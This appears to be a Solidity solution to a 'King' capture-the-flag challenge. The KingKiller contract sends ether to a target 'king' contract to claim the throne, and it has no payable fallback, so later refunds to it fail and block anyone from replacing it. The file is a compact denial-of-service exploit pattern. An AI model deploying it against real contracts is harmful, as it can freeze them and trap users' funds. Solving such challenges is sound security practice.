// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingKiller{
    constructor (address payable _king) payable{
        (bool sent, ) = _king.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    } 
}
